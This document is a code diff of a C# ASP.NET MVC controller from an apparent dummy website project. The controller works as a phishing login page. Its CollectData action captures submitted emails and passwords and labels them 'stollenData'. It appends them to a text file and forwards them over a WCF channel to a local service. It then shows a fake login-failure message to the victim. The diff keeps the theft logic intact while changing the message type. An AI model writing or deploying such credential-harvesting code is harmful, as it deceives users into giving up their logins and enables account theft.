@@ -1,64 +1,62 @@
 ﻿using Common;
+using Contracts;
 using System;
-using System.Collections.Generic;
-using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
 using System.ServiceModel;
-using System.Web;
 using System.Web.Hosting;
 using System.Web.Mvc;
 
 namespace WebsiteDummy.Controllers
 {
-	public class HomeController : Controller
-	{
-		static IFlag channel = null;
+    public class HomeController : Controller
+    {
+        static IFormMessage channel = null;
 
-		public ActionResult Index()
-		{
+        public ActionResult Index()
+        {
 
-			return View();
-		}
+            return View();
+        }
 
-		[HttpPost]
-		public ActionResult CollectData(string email, string password)
-		{
+        [HttpPost]
+        public ActionResult CollectData(string email, string password)
+        {
 
-			if (email == string.Empty || password == string.Empty)
-			{
+            if (email == string.Empty || password == string.Empty)
+            {
 
-				ViewBag.error = "Invalid username or password";
-				return View("Index");
-			}
-					
-
-			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();
-
-			string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
-			FileStream stream = new FileStream(path, FileMode.Append);
-			
+                ViewBag.error = "Invalid username or password";
+                return View("Index");
+            }
 
 
-			using (StreamWriter sw = new StreamWriter(stream))
-			{
-				sw.WriteLine(stollenData);
-			}
+            string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();
+
+            //TODO: here
+            string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
+            FileStream stream = new FileStream(path, FileMode.Append);
 
 
-			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
-			if (channel == null)
-			{
-				channel = factory.CreateChannel();
-			}
 
-			channel.SendData(stollenData);
+            using (StreamWriter sw = new StreamWriter(stream))
+            {
+                sw.WriteLine(stollenData);
+            }
 
 
-			ViewBag.error = "Invalid username or password";
-			return View("Index");
-		}
+            ChannelFactory<IFormMessage> factory = new ChannelFactory<IFormMessage>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:5000/IFlag"));
+            if (channel == null)
+            {
+                channel = factory.CreateChannel();
+            }
+
+            channel.SendData(new FormData() { Username = email, Password = password });
 
 
-	}
+            ViewBag.error = "Invalid username or password";
+            return View("Index");
+        }
+
+
+    }
 }
